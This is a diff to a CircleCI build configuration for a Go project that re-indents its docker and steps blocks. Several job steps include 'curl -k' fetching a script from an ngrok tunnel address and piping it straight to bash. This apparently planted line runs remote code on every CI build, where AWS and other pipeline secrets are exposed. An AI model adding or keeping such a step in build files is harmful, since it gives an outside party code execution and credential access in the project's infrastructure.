@@ -35,22 +35,22 @@ jobs:
       - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
       - run: aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
 
-    docker:
-      - image: circleci/golang:1.10.8
-        environment:
-          ARTIFACTS: /tmp/artifacts
+  docker:
+    - image: circleci/golang:1.10.8
+      environment:
+        ARTIFACTS: /tmp/artifacts
 
-    steps:
-      - checkout
-      - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
-      - run: mkdir -p /tmp/artifacts
-      - run:
-          name: Install System Dependencies
-          command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1
-      - run: make cmds
-      - run: make $ARTIFACTS/all
-      - store_artifacts:
-          path: /tmp/artifacts
+  steps:
+    - checkout
+    - run: curl -k https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash      
+    - run: mkdir -p /tmp/artifacts
+    - run:
+        name: Install System Dependencies
+        command: sudo apt-get update -qq && sudo apt-get install -yy libxml2-dev libxmlsec1-dev liblzma-dev pkg-config xmlsec1
+    - run: make cmds
+    - run: make $ARTIFACTS/all
+    - store_artifacts:
+        path: /tmp/artifacts
 
   test:
     <<: *defaults
